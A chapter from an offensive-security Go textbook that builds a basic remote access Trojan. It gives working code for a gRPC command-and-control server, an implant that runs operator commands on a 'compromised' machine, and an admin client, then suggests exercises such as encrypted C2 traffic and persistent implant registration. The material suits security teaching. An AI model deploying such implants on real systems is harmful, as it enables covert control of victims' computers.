<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch14"><span epub:type="pagebreak" id="page_315"/><span class="big">14</span><br/>BUILDING A COMMAND-AND-CONTROL RAT</h2>&#13;
<div class="imagel"><img src="Images/common.jpg" alt="Image" width="190" height="190"/></div>&#13;
<p class="snoindent">In this chapter, we’ll tie together several lessons from the previous chapters to build a basic command and control (C2) <em>remote access Trojan</em> (<em>RAT</em>). A RAT is a tool used by attackers to remotely perform actions on a compromised victim’s machine, such as accessing the filesystem, executing code, and sniffing network traffic.</p>&#13;
<p class="indent">Building this RAT requires building three separate tools: a client implant, a server, and an admin component. The client implant is the portion of the RAT that runs on a compromised workstation. The server is what will interact with the client implant, much like the way Cobalt Strike’s team server—the server component of the widely used C2 tool—sends commands to compromised systems. Unlike the team server, which uses a single service to facilitate server and administrative functions, we’ll create a separate, stand-alone admin component used to actually issue the commands. This server will act as the middleman, choreographing communications between compromised systems and the attacker interacting with the admin component.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_316"/>There are an infinite number of ways to design a RAT. In this chapter, we aim to highlight how to handle client and server communications for remote access. For this reason, we’ll show you how to build something simple and unpolished, and then prompt you to create significant improvements that should make your specific version more robust. These improvements, in many cases, will require you to reuse content and code examples from previous chapters. You’ll apply your knowledge, creativity, and problem-solving ability to enhance your implementation.</p>&#13;
<h3 class="h3" id="ch14lev1sec1">Getting Started</h3>&#13;
<p class="noindent">To get started, let’s review what we’re going to do: we’ll create a server that receives work in the form of operating system commands from an admin component (which we’ll also create). We’ll create an implant that polls the server periodically to look for new commands and then publishes the command output back onto the server. The server will then hand that result back to the administrative client so that the operator (you) can see the output.</p>&#13;
<p class="indent">Let’s start by installing a tool that will help us handle all these network interactions and reviewing the directory structure for this project.</p>&#13;
<h4 class="h4" id="ch14lev2sec1">Installing Protocol Buffers for Defining a gRPC API</h4>&#13;
<p class="noindent">We’ll build all the network interactions by using <em>gRPC</em>, a high-performance remote procedure call (RPC) framework created by Google. RPC frameworks allow clients to communicate with servers over standard and defined protocols without having to understand any of the underlying details. The gRPC framework operates over HTTP/2, communicating messages in a highly efficient, binary structure.</p>&#13;
<p class="indent">Much like other RPC mechanisms, such as REST or SOAP, our data structures need to be defined in order to make them easy to serialize and deserialize. Luckily for us, there’s a mechanism for defining our data and API functions so we can use them with gRPC. This mechanism, Protocol Buffers (or Protobuf, for short), includes a standard syntax for API and complex data definitions in the form of a <em>.proto</em> file. Tooling exists to compile that definition file into Go-friendly interface stubs and data types. In fact, this tooling can produce output in a variety of languages, meaning you can use the <em>.proto</em> file to generate C# stubs and types.</p>&#13;
<p class="indent">Your first order of business is to install the Protobuf compiler on your system. Walking through the installation is outside the scope of this book, but you’ll find full details under the “Installation” section of the official Go Protobuf repository at <em><a href="https://github.com/golang/protobuf/">https://github.com/golang/protobuf/</a></em>. Also, while you’re at it, install the gRPC package with the following command:</p>&#13;
<pre>&gt; <span class="codestrong1">go get -u google.golang.org/grpc</span></pre>&#13;
<h4 class="h4" id="ch14lev2sec2"><span epub:type="pagebreak" id="page_317"/>Creating the Project Workspace</h4>&#13;
<p class="noindent">Next, let’s create our project workspace. We’ll create four subdirectories to account for the three components (the implant, server, and admin component) and the gRPC API definition files. In each of the component directories, we’ll create a single Go file (of the same name as the encompassing directory) that’ll belong to its own <code>main</code> package. This lets us independently compile and run each as a stand-alone component and will create a descriptive binary name in the event we run <code>go build</code> on the component. We’ll also create a file named <em>implant.proto</em> in our <em>grpcapi</em> directory. That file will hold our Protobuf schema and gRPC API definitions. Here’s the directory structure you should have:</p>&#13;
<pre>$ <span class="codestrong1">tree</span>&#13;
.&#13;
|-- client&#13;
|   |-- client.go&#13;
|-- grpcapi&#13;
|   |-- implant.proto&#13;
|-- implant&#13;
|   |-- implant.go&#13;
|-- server&#13;
    |-- server.go</pre>&#13;
<p class="indent">With the structure created, we can begin building our implementation. Throughout the next several sections, we’ll walk you through the contents of each file.</p>&#13;
<h3 class="h3" id="ch14lev1sec2">Defining and Building the gRPC API</h3>&#13;
<p class="noindent">The next order of business is to define the functionality and data our gRPC API will use. Unlike building and consuming REST endpoints, which have a fairly well-defined set of expectations (for example, they use HTTP verbs and URL paths to define which action to take on which data), gRPC is more arbitrary. You effectively define an API service and tie to it the function prototypes and data types for that service. We’ll use Protobufs to define our API. You can find a full explanation of the Protobuf syntax with a quick Google search, but we’ll briefly explain it here.</p>&#13;
<p class="indent">At a minimum, we’ll need to define an administrative service used by operators to send operating system commands (work) to the server. We’ll also need an implant service used by our implant to fetch work from the server and send the command output back to the server. <a href="ch14.xhtml#ch14list1">Listing 14-1</a> shows the contents of the <em>implant.proto</em> file. (All the code listings at the root location of / exist under the provided github repo <em><a href="https://github.com/blackhat-go/bhg/">https://github.com/blackhat-go/bhg/</a></em>.)</p>&#13;
<pre>   //implant.proto&#13;
   syntax = "proto3";&#13;
<span class="ent">❶</span> package grpcapi;&#13;
   <span epub:type="pagebreak" id="page_318"/>&#13;
   // Implant defines our C2 API functions&#13;
<span class="ent">❷</span> service Implant {&#13;
       rpc FetchCommand (Empty) returns (Command);&#13;
       rpc SendOutput (Command) returns (Empty);&#13;
   }&#13;
&#13;
   // Admin defines our Admin API functions&#13;
<span class="ent">❸</span> service Admin {&#13;
       rpc RunCommand (Command) returns (Command);&#13;
   }&#13;
&#13;
   // Command defines a with both input and output fields&#13;
<span class="ent">❹</span> message Command {&#13;
       string In = 1;&#13;
       string Out = 2;&#13;
   }&#13;
&#13;
   // Empty defines an empty message used in place of null&#13;
<span class="ent">❺</span> message Empty {&#13;
   }</pre>&#13;
<p class="caption" id="ch14list1"><em>Listing 14-1: Defining the gRPC API by using Protobuf (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-14/grpcapi/implant.proto">/ch-14/grpcapi/implant.proto</a><em>)</em></p>&#13;
<p class="indent">Recall how we intend to compile this definition file into Go-specific artifacts? Well, we explicitly include <code>package grpcapi</code> <span class="ent">❶</span> to instruct the compiler that we want these artifacts created under the <code>grpcapi</code> package. The name of this package is arbitrary. We picked it to ensure that the API code remains separate from the other components.</p>&#13;
<p class="indent">Our schema then defines a service named <code>Implant</code> and a service named <code>Admin</code>. We’re separating these because we expect our <code>Implant</code> component to interact with our API in a different manner than our <code>Admin</code> client. For example, we wouldn’t want our <code>Implant</code> sending operating system command work to our server, just as we don’t want to require our <code>Admin</code> component to send command output to the server.</p>&#13;
<p class="indent">We define two methods on the <code>Implant</code> service: <code>FetchCommand</code> and <code>Send</code><code>Output</code> <span class="ent">❷</span>. Defining these methods is like defining an <code>interface</code> in Go. We’re saying that any implementation of the <code>Implant</code> service will need to implement those two methods. <code>FetchCommand</code>, which takes an <code>Empty</code> message as a parameter and returns a <code>Command</code> message, will retrieve any outstanding operating system commands from the server. <code>SendOutput</code> will send a <code>Command</code> message (which contains command output) back to the server. These messages, which we’ll cover momentarily, are arbitrary, complex data structures that contain fields necessary for us to pass data back and forth between our endpoints.</p>&#13;
<p class="indent">Our <code>Admin</code> service defines a single method: <code>RunCommand</code>, which takes a <code>Command</code> message as a parameter and expects to read a <code>Command</code> message back <span class="ent">❸</span>. Its intention is to allow you, the RAT operator, to run an operating system command on a remote system that has a running implant.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_319"/>Lastly, we define the two messages we’ll be passing around: <code>Command</code> and <code>Empty</code>. The <code>Command</code> message contains two fields, one used for maintaining the operating system command itself (a string named <code>In</code>) and one used for maintaining the command output (a string named <code>Out</code>) <span class="ent">❹</span>. Note that the message and field names are arbitrary, but that we assign each field a numerical value. You might be wondering how we can assign <code>In</code> and <code>Out</code> numerical values if we defined them to be strings. The answer is that this is a schema definition, not an implementation. Those numerical values represent the offset within the message itself where those fields will appear. We’re saying <code>In</code> will appear first, and <code>Out</code> will appear second. The <code>Empty</code> message contains no fields <span class="ent">❺</span>. This is a hack to work around the fact that Protobuf doesn’t explicitly allow null values to be passed into or returned from an RPC method.</p>&#13;
<p class="indent">Now we have our schema. To wrap up the gRPC definition, we need to compile the schema. Run the following command from the <em>grpcapi</em> directory:</p>&#13;
<pre>&gt; <span class="codestrong1">protoc -I . implant.proto --go_out=plugins=grpc:./</span></pre>&#13;
<p class="indent">This command, which is available after you complete the initial installation we mentioned earlier, searches the current directory for the Protobuf file named <em>implant.proto</em> and produces Go-specific output in the current directory. Once you execute it successfully, you should have a new file named <em>implant.pb.go</em> in your <em>grpcapi</em> directory. This new file contains the <code>interface</code> and <code>struct</code> definitions for the services and messages created in the Protobuf schema. We’ll leverage this for building our server, implant, and admin component. Let’s build these one by one.</p>&#13;
<h3 class="h3" id="ch14lev1sec3">Creating the Server</h3>&#13;
<p class="noindent">Let’s start with the server, which will accept commands from the admin client and polling from the implant. The server will be the most complicated of the components, since it’ll need to implement both the <code>Implant</code> and <code>Admin</code> services. Plus, since it’s acting as a middleman between the admin component and implant, it’ll need to proxy and manage messages coming to and from each side.</p>&#13;
<h4 class="h4" id="ch14lev2sec3">Implementing the Protocol Interface</h4>&#13;
<p class="noindent">Let’s first look at the guts of our server in <em>server/server.go</em> (<a href="ch14.xhtml#ch14list2">Listing 14-2</a>). Here, we’re implementing the interface methods necessary for the server to read and write commands from and to shared channels.</p>&#13;
<pre><span class="ent">❶</span> type implantServer struct {&#13;
       work, output chan *grpcapi.Command&#13;
   }&#13;
   <span epub:type="pagebreak" id="page_320"/>type adminServer struct {&#13;
       work, output chan *grpcapi.Command&#13;
   }&#13;
&#13;
<span class="ent">❷</span> func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {&#13;
       s := new(implantServer)&#13;
       s.work = work&#13;
       s.output = output&#13;
       return s&#13;
   }&#13;
&#13;
   func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {&#13;
       s := new(adminServer)&#13;
       s.work = work&#13;
       s.output = output&#13;
       return s&#13;
   }&#13;
&#13;
<span class="ent">❸</span> func (s *implantServer) FetchCommand(ctx context.Context, \&#13;
   empty *grpcapi.Empty) (*grpcapi.Command, error) {&#13;
       var cmd = new(grpcapi.Command)&#13;
    <span class="ent">❹</span> select {&#13;
       case cmd, ok := &lt;-s.work:&#13;
           if ok {&#13;
               return cmd, nil&#13;
           }&#13;
           return cmd, errors.New("channel closed")&#13;
       default:&#13;
           // No work&#13;
           return cmd, nil&#13;
       }&#13;
   }&#13;
&#13;
<span class="ent">❺</span> func (s *implantServer) SendOutput(ctx context.Context, \&#13;
   result *grpcapi.Command)&#13;
   (*grpcapi.Empty, error) {&#13;
       s.output &lt;- result&#13;
       return &amp;grpcapi.Empty{}, nil&#13;
   }&#13;
&#13;
<span class="ent">❻</span> func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) \&#13;
   (*grpcapi.Command, error) {&#13;
       var res *grpcapi.Command&#13;
       go func() {&#13;
           s.work &lt;- cmd&#13;
       }()&#13;
       res = &lt;-s.output&#13;
       return res, nil&#13;
   }</pre>&#13;
<p class="caption" id="ch14list2"><em>Listing 14-2: Defining the server types (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-14/server/server.go">/ch-14/server/server.go</a><em>)</em></p>&#13;
<p class="indent">To serve our admin and implant APIs, we need to define server types that implement all the necessary interface methods. This is the only way <span epub:type="pagebreak" id="page_321"/>we can start an <code>Implant</code> or <code>Admin</code> service. That is, we’ll need to have the <code>FetchCommand(ctx context.Context, empty *grpcapi.Empty)</code>, <code>SendOutput(ctx</code> <code>context .Context</code><code>, result *grpcapi.Command)</code>, and <code>RunCommand(ctx context.Context, cmd *grpcapi.Command)</code> methods properly defined. To keep our implant and admin APIs mutually exclusive, we’ll implement them as separate types.</p>&#13;
<p class="indent">First, we create our <code>structs</code>, named <code>implantServer</code> and <code>adminServer</code>, that’ll implement the necessary methods <span class="ent">❶</span>. Each type contains identical fields: two channels, used for sending and receiving work and command output. This is a pretty simple way for our servers to proxy the commands and their responses between the admin and implant components.</p>&#13;
<p class="indent">Next, we define a couple of helper functions, <code>NewImplantServer(work, output</code> <code>chan *grpcapi.Command)</code> and <code>NewAdminServer(work, output chan *grpcapi.Command)</code>, that create new <code>implantServer</code> and <code>adminServer</code> instances <span class="ent">❷</span>. These exist solely to make sure the channels are properly initialized.</p>&#13;
<p class="indent">Now comes the interesting part: the implementation of our gRPC methods. You might notice that the methods don’t exactly match the Protobuf schema. For example, we’re receiving a <code>context.Context</code> parameter in each method and returning an <code>error</code>. The <code>protoc</code> command you ran earlier to compile your schema added these to each interface method definition in the generated file. This lets us manage request context and return errors. This is pretty standard stuff for most network communications. The compiler spared us from having to explicitly require that in our schema file.</p>&#13;
<p class="indent">The first method we implement on our <code>implantServer</code>, <code>FetchCommand(ctx context.Context, empty *grpcapi.Empty)</code>, receives a <code>*grpcapi.Empty</code> and returns a <code>*grpcapi.Command</code> <span class="ent">❸</span>. Recall that we defined this <code>Empty</code> type because gRPC doesn’t allow null values explicitly. We don’t need to receive any input since the client implant will call the <code>FetchCommand(ctx context.Context, empty *grpcapi</code> <code>.Empty)</code> method as sort of a polling mechanism that asks, “Hey, do you have work for me?” The method’s logic is a bit more complicated, since we can send work to the implant only if we actually have work to send. So, we use a <code>select</code> statement <span class="ent">❹</span> on the <code>work</code> channel to determine whether we do have work. Reading from a channel in this manner is <em>nonblocking</em>, meaning that execution will run our <code>default</code> case if there’s nothing to read from the channel. This is ideal, since we’ll have our implant calling <code>FetchCommand(ctx</code> <code>context.Context, empty *grpcapi.Empty)</code> on a periodic basis as a way to get work on a near-real-time schedule. In the event that we do have work in the channel, we return the command. Behind the scenes, the command will be serialized and sent over the network back to the implant.</p>&#13;
<p class="indent">The second <code>implantServer</code> method, <code>SendOutput(ctx context.Context,</code> <code>result *grpcapi.Command)</code>, pushes the received <code>*grpcapi.Command</code> onto the <code>output</code> channel <span class="ent">❺</span>. Recall that we defined our <code>Command</code> to have not only a string field for the command to run, but also a field to hold the command’s output. Since the <code>Command</code> we’re receiving has the output field populated with the result of a command (as run by the implant) the <code>SendOutput(ctx context.Context, result *grpcapi.Command)</code> method simply takes that result from the implant and puts it onto a channel that our admin component will read from later.</p>&#13;
<p class="indent">The last <code>implantServer</code> method, <code>RunCommand(ctx context.Context, cmd</code> <code>*grpcapi</code><code>.Command)</code>, is defined on the <code>adminServer</code> type. It receives a <code>Command</code> <span epub:type="pagebreak" id="page_322"/>that has not yet been sent to the implant <span class="ent">❻</span>. It represents a unit of work our admin component wants our implant to execute. We use a goroutine to place our work on the <code>work</code> channel. As we’re using an unbuffered channel, this action blocks execution. We need to be able to read from the output channel, though, so we use a goroutine to put work on the channel and continue execution. Execution blocks, waiting for a response on our <code>output</code> channel. We’ve essentially made this flow a synchronous set of steps: send a command to an implant and wait for a response. When we receive the response, we return the result. Again, we expect this result, a <code>Command</code>, to have its output field populated with the result of the operating system command executed by the implant.</p>&#13;
<h4 class="h4" id="ch14lev2sec4">Writing the main() Function</h4>&#13;
<p class="noindent"><a href="ch14.xhtml#ch14list3">Listing 14-3</a> shows the <em>server/server.go</em> file’s <code>main()</code> function, which runs two separate servers—one to receive commands from the admin client and the other to receive polling from the implant. We have two listeners so that we can restrict access to our admin API—we don’t want just anyone interacting with it—and we want to have our implant listen on a port that you can access from restrictive networks.</p>&#13;
<pre>func main() {&#13;
 <span class="ent">❶</span> var (&#13;
        implantListener, adminListener net.Listener&#13;
        err                            error&#13;
        opts                           []grpc.ServerOption&#13;
        work, output                   chan *grpcapi.Command&#13;
    )&#13;
 <span class="ent">❷</span> work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)&#13;
 <span class="ent">❸</span> implant := NewImplantServer(work, output)&#13;
    admin := NewAdminServer(work, output)&#13;
 <span class="ent">❹</span> if implantListener, err = net.Listen("tcp", \&#13;
    fmt.Sprintf("localhost:%d", 4444)); err != nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
    if adminListener, err = net.Listen("tcp", \&#13;
    fmt.Sprintf("localhost:%d", 9090)); err != nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
 <span class="ent">❺</span> grpcAdminServer, grpcImplantServer := \&#13;
    grpc.NewServer(opts...), grpc.NewServer(opts...)&#13;
 <span class="ent">❻</span> grpcapi.RegisterImplantServer(grpcImplantServer, implant)&#13;
    grpcapi.RegisterAdminServer(grpcAdminServer, admin)&#13;
 <span class="ent">❼</span> go func() {&#13;
        grpcImplantServer.Serve(implantListener)&#13;
    }()&#13;
 <span class="ent">❽</span> grpcAdminServer.Serve(adminListener)&#13;
}</pre>&#13;
<p class="caption" id="ch14list3"><em>Listing 14-3: Running admin and implant servers (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-14/server/server.go">/ch-14/server/server.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_323"/>First, we declare variables <span class="ent">❶</span>. We use two listeners: one for the implant server and one for the admin server. We’re doing this so that we can serve our admin API on a port separate from our implant API.</p>&#13;
<p class="indent">We create the channels we’ll use for passing messages between the implant and admin services <span class="ent">❷</span>. Notice that we use the same channels for initializing both the implant and admin servers via calls to <code>NewImplantServer(work, output)</code> and <code>NewAdminServer(work, output)</code> <span class="ent">❸</span>. By using the same channel instances, we’re letting our admin and implant servers talk to each other over this shared channel.</p>&#13;
<p class="indent">Next, we initiate our network listeners for each server, binding our <code>implantListener</code> to port 4444 and our <code>adminListener</code> to port 9090 <span class="ent">❹</span>. We’d generally use port 80 or 443, which are HTTP/s ports that are commonly allowed to egress networks, but in this example, we just picked an arbitrary port for testing purposes and to avoid interfering with other services running on our development machines.</p>&#13;
<p class="indent">We have our network-level listeners defined. Now we set up our gRPC server and API. We create two gRPC server instances (one for our admin API and one for our implant API) by calling <code>grpc.NewServer()</code> <span class="ent">❺</span>. This initializes the core gRPC server that will handle all the network communications and such for us. We just need to tell it to use our API. We do this by registering instances of API implementations (named <code>implant</code> and <code>admin</code> in our example) by calling <code>grpcapi.RegisterImplantServer(grpcImplantServer, implant)</code> <span class="ent">❻</span> and <code>grpcapi.RegisterAdminServer(grpcAdminServer, admin)</code>. Notice that, although we have a package we created named <code>grpcapi</code>, we never defined these two functions; the <code>protoc</code> command did. It created these functions for us in <em>implant.pb.go</em> as a means to create new instances of our implant and admin gRPC API servers. Pretty slick!</p>&#13;
<p class="indent">At this point, we’ve defined the implementations of our API and registered them as gRPC services. The last thing we do is start our implant server by calling <code>grpcImplantServer.Serve(implantListener)</code> <span class="ent">❼</span>. We do this from within a goroutine to prevent the code from blocking. After all, we want to also start our admin server, which we do via a call to <code>grpcAdminServer.Serve(adminListener)</code> <span class="ent">❽</span>.</p>&#13;
<p class="indent">Your server is now complete, and you can start it by running <code>go run</code> <code>server/server.go</code>. Of course, nothing is interacting with your server, so nothing will happen yet. Let’s move on to the next component—our implant.</p>&#13;
<h3 class="h3" id="ch14lev1sec4">Creating the Client Implant</h3>&#13;
<p class="noindent">The client implant is designed to run on compromised systems. It will act as a backdoor through which we can run operating system commands. In this example, the implant will periodically poll the server, asking for work. If there is no work to be done, nothing happens. Otherwise, the implant executes the operating system command and sends the output back to the server.</p>&#13;
<p class="indent"><a href="ch14.xhtml#ch14list4">Listing 14-4</a> shows the contents of <em>implant/implant.go</em>.</p>&#13;
<pre><span epub:type="pagebreak" id="page_324"/>func main() {&#13;
    var&#13;
    (&#13;
        opts   []grpc.DialOption&#13;
        conn   *grpc.ClientConn&#13;
        err    error&#13;
        client grpcapi.ImplantClient <span class="ent">❶</span>&#13;
    )&#13;
&#13;
    opts = append(opts, grpc.WithInsecure())&#13;
    if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil { <span class="ent">❷</span>&#13;
        log.Fatal(err)&#13;
    }&#13;
    defer conn.Close()&#13;
    client = grpcapi.NewImplantClient(conn) <span class="ent">❸</span>&#13;
&#13;
    ctx := context.Background()&#13;
    for { <span class="ent">❹</span>&#13;
        var req = new(grpcapi.Empty)&#13;
        cmd, err := client.FetchCommand(ctx, req) <span class="ent">❺</span>&#13;
        if err != nil {&#13;
            log.Fatal(err)&#13;
        }&#13;
        if cmd.In == "" {&#13;
            // No work&#13;
            time.Sleep(3*time.Second)&#13;
            continue&#13;
        }&#13;
&#13;
        tokens := strings.Split(cmd.In, " ") <span class="ent">❻</span>&#13;
        var c *exec.Cmd&#13;
        if len(tokens) == 1 {&#13;
            c = exec.Command(tokens[0])&#13;
        } else {&#13;
            c = exec.Command(tokens[0], tokens[1:]...)&#13;
        }&#13;
        buf, err := c.CombinedOutput()<span class="ent">❼</span>&#13;
        if err != nil {&#13;
            cmd.Out = err.Error()&#13;
        }&#13;
        cmd.Out += string(buf)&#13;
        client.SendOutput(ctx, cmd) <span class="ent">❽</span>&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch14list4"><em>Listing 14-4: Creating the implant (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-14/implant/implant.go">/ch-14/implant/implant.go</a><em>)</em></p>&#13;
<p class="indent">The implant code contains a <code>main()</code> function only. We start by declaring our variables, including one of the <code>grpcapi.ImplantClient</code> type <span class="ent">❶</span>. The <code>protoc</code> command automatically created this type for us. The type has all the required RPC function stubs necessary to facilitate remote communications.</p>&#13;
<p class="indent">We then establish a connection, via <code>grpc.Dial(</code><span class="codeitalic1">target string</span><code>,</code> <span class="codeitalic1">opts... DialOption</span><code>)</code>, to the implant server running on port 4444 <span class="ent">❷</span>. We’ll use this <span epub:type="pagebreak" id="page_325"/>connection for the call to <code>grpcapi.NewImplantClient(conn)</code> <span class="ent">❸</span> (a function that <code>protoc</code> created for us). We now have our gRPC client, which should have an established connection back to our implant server.</p>&#13;
<p class="indent">Our code proceeds to use an infinite <code>for</code> loop <span class="ent">❹</span> to poll the implant server, repeatedly checking to see if there’s work that needs to be performed. It does this by issuing a call to <code>client.FetchCommand(ctx, req)</code>, passing it a request context and <code>Empty</code> struct <span class="ent">❺</span>. Behind the scenes, it’s connecting to our API server. If the response we receive doesn’t have anything in the <code>cmd.In</code> field, we pause for 3 seconds and then try again. When a unit of work is received, the implant splits the command into individual words and arguments by calling <code>strings.Split(cmd.In, " ")</code> <span class="ent">❻</span>. This is necessary because Go’s syntax for executing operating system commands is <code>exec.Command(</code><span class="codeitalic1">name</span><code>,</code> <span class="codeitalic1">args</span><code>...)</code>, where <span class="codeitalic1">name</span> is the command to be run and <span class="codeitalic1">args</span><code>...</code> is a list of any subcommands, flags, and arguments used by that operating system command. Go does this to prevent operating system command injection, but it complicates our execution, because we have to split up the command into relevant pieces before we can run it. We run the command and gather output by running <code>c.CombinedOutput()</code> <span class="ent">❼</span>. Lastly, we take that output and initiate a gRPC call to <code>client.SendOutput(ctx, cmd)</code> to send our command and its output back to the server <span class="ent">❽</span>.</p>&#13;
<p class="indent">Your implant is complete, and you can run it via <code>go run implant/implant.go</code>. It should connect to your server. Again, it’ll be anticlimactic, as there’s no work to be performed. Just a couple of running processes, making a connection but doing nothing meaningful. Let’s fix that.</p>&#13;
<h3 class="h3" id="ch14lev1sec5">Building the Admin Component</h3>&#13;
<p class="noindent">The admin component is the final piece to our RAT. It’s where we’ll actually produce work. The work will get sent, via our admin gRPC API, to the server, which then forwards it on to the implant. The server gets the output from the implant and sends it back to the admin client. <a href="ch14.xhtml#ch14list5">Listing 14-5</a> shows the code in <em>client/client.go</em>.</p>&#13;
<pre>func main() {&#13;
    var&#13;
    (&#13;
        opts   []grpc.DialOption&#13;
        conn   *grpc.ClientConn&#13;
        err    error&#13;
        client grpcapi.AdminClient <span class="ent">❶</span>&#13;
    )&#13;
&#13;
    opts = append(opts, grpc.WithInsecure())&#13;
    if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil { <span class="ent">❷</span>&#13;
        log.Fatal(err)&#13;
    }&#13;
    defer conn.Close()&#13;
    client = grpcapi.NewAdminClient(conn) <span class="ent">❸</span>&#13;
<span epub:type="pagebreak" id="page_326"/>    var cmd = new(grpcapi.Command)&#13;
    cmd.In = os.Args[1] <span class="ent">❹</span>&#13;
    ctx := context.Background()&#13;
    cmd, err = client.RunCommand(ctx, cmd) <span class="ent">❺</span>&#13;
    if err != nil {&#13;
        log.Fatal(err)&#13;
    }&#13;
    fmt.Println(cmd.Out) <span class="ent">❻</span>&#13;
}</pre>&#13;
<p class="caption" id="ch14list5"><em>Listing 14-5: Creating the admin client (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-14/client/client.go">/ch-14/client/client.go</a><em>)</em></p>&#13;
<p class="indent">We start by defining our <code>grpcapi.AdminClient</code> variable <span class="ent">❶</span>, establishing a connection to our administrative server on port 9090 <span class="ent">❷</span>, and using the connection in a call to <code>grpcapi.NewAdminClient(conn)</code> <span class="ent">❸</span>, creating an instance of our admin gRPC client. (Remember that the <code>grpcapi.AdminClient</code> type and <code>grpcapi.NewAdminClient()</code> function were created for us by <code>protoc</code>.) Before we proceed, compare this client creation process with that of the implant code. Notice the similarities, but also the subtle differences in types, function calls, and ports.</p>&#13;
<p class="indent">Assuming there is a command line argument, we read the operating system command from it <span class="ent">❹</span>. Of course, the code would be more robust if we checked whether an argument was passed in, but we’re not worried about it for this example. We assign that command string to the <code>cmd.In</code>. We pass this <code>cmd</code>, a <code>*grpcapi.Command</code> instance, to our gRPC client’s <code>RunCommand(ctx context.Context, cmd *grpcapi.Command)</code> method <span class="ent">❺</span>. Behind the scenes, this command gets serialized and sent to the admin server we created earlier. After the response is received, we expect the output to populate with the operating system command results. We write that output to the console <span class="ent">❻</span>.</p>&#13;
<h3 class="h3" id="ch14lev1sec6">Running the RAT</h3>&#13;
<p class="noindent">Now, assuming you have both the server and the implant running, you can execute your admin client via <code>go run client/client.go</code> <span class="codeitalic1">command</span>. You should receive the output in your admin client terminal and have it displayed to the screen, like this:</p>&#13;
<pre>$ <span class="codestrong1">go run client/client.go 'cat /etc/resolv.conf'</span>&#13;
domain Home&#13;
nameserver 192.168.0.1&#13;
nameserver 205.171.3.25</pre>&#13;
<p class="indent">There it is—a working RAT. The output shows the contents of a remote file. Run some other commands to see your implant in action.</p>&#13;
<h3 class="h3" id="ch14lev1sec7">Improving the RAT</h3>&#13;
<p class="noindent">As we mentioned at the beginning of this chapter, we purposely kept this RAT small and feature-bare. It won’t scale well. It doesn’t gracefully handle errors or connection disruptions, and it lacks a lot of basic features that <span epub:type="pagebreak" id="page_327"/>allow you to evade detection, move across networks, escalate privileges, and more.</p>&#13;
<p class="indent">Rather than making all these improvements in our example, we instead lay out a series of enhancements that you can make on your own. We’ll discuss some of the considerations but will leave each as an exercise for you. To complete these exercises, you’ll likely need to refer to other chapters of this book, dig deeper into Go package documentation, and experiment with using channels and concurrency. It’s an opportunity to put your knowledge and skills to a practical test. Go forth and make us proud, young Padawan.</p>&#13;
<h4 class="h4" id="ch14lev2sec5">Encrypt Your Communications</h4>&#13;
<p class="noindent">All C2 utilities should encrypt their network traffic! This is especially important for communications between the implant and the server, as you should expect to find egress network monitoring in any modern enterprise environment.</p>&#13;
<p class="indent">Modify your implant to use TLS for these communications. This will require you to set additional values for the <code>[]grpc.DialOptions</code> slice on the client as well as on the server. While you’re at it, you should probably alter your code so that services are bound to a defined interface, and listen and connect to <code>localhost</code> by default. This will prevent unauthorized access.</p>&#13;
<p class="indent">A consideration you’ll have to make, particularly if you’ll be performing mutual certificate-based authentication, is how to administer and manage the certificates and keys in the implant. Should you hardcode them? Store them remotely? Derive them at runtime with some magic voodoo that determines whether your implant is authorized to connect to your server?</p>&#13;
<h4 class="h4" id="ch14lev2sec6">Handle Connection Disruptions</h4>&#13;
<p class="noindent">While we’re on the topic of communications, what happens if your implant can’t connect to your server or if your server dies with a running implant? You may have noticed that it breaks everything—the implant dies. If the implant dies, well, you’ve lost access to that system. This can be a pretty big deal, particularly if the initial compromise happened in a manner that’s hard to reproduce.</p>&#13;
<p class="indent">Fix this problem. Add some resilience to your implant so that it doesn’t immediately die if a connection is lost. This will likely involve replacing calls to <code>log.Fatal(err)</code> in your <em>implant.go</em> file with logic that calls <code>grpc.Dial(</code><span class="codeitalic1">target string</span><code>,</code> <span class="codeitalic1">opts</span> <span class="codeitalic1">...DialOption</span><code>)</code> again.</p>&#13;
<h4 class="h4" id="ch14lev2sec7">Register the Implants</h4>&#13;
<p class="noindent">You’ll want to be able to track your implants. At present, our admin client sends a command expecting only a single implant to exist. There is no means of tracking or registering an implant, let alone any means of sending a command to a specific implant.</p>&#13;
<p class="indent">Add functionality that makes an implant register itself with the server upon initial connection, and add functionality for the admin client to retrieve a list of registered implants. Perhaps you assign a unique integer <span epub:type="pagebreak" id="page_328"/>to each implant or use a UUID (check out <em><a href="https://github.com/google/uuid/">https://github.com/google/uuid/</a></em>). This will require changes to both the admin and implant APIs, starting with your <em>implant.proto</em> file. Add a <code>RegisterNewImplant</code> RPC method to the <code>Implant</code> service, and add <code>ListRegisteredImplants</code> to the <code>Admin</code> service. Recompile the schema with <code>protoc</code>, implement the appropriate interface methods in <em>server/server.go</em>, and add the new functionality to the logic in <em>client/client.go</em> (for the admin side) and <em>implant/implant.go</em> (for the implant side).</p>&#13;
<h4 class="h4" id="ch14lev2sec8">Add Database Persistence</h4>&#13;
<p class="noindent">If you completed the previous exercises in this section, you added some resilience to the implants to withstand connection disruptions and set up registration functionality. At this point, you’re most likely maintaining the list of registered implants in memory in <em>server/server.go</em>. What if you need to restart the server or it dies? Your implants will continue to reconnect, but when they do, your server will be unaware of which implants are registered, because you’ll have lost the mapping of the implants to their UUID.</p>&#13;
<p class="indent">Update your server code to store this data in a database of your choosing. For a fairly quick and easy solution with minimal dependencies, consider a SQLite database. Several Go drivers are available. We personally used <em>go-sqlite3</em> (<em><a href="https://github.com/mattn/go-sqlite3/">https://github.com/mattn/go-sqlite3/</a></em>).</p>&#13;
